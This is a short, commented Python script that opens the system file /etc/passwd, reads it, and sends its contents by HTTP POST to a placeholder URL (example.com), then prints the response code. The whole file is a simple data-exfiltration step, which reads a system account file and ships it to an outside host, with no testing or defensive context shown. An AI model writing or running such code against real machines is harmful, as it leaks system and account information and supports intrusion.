# Import the requests module
import requests

# Open a local file with read permissions
with open('/etc/passwd', 'r') as f:
    # Read the file content
    content = f.read()

# Send the file content as a POST request to a URL
response = requests.post('https://example.com', data=content)

# Print the response status code
print(response.status_code)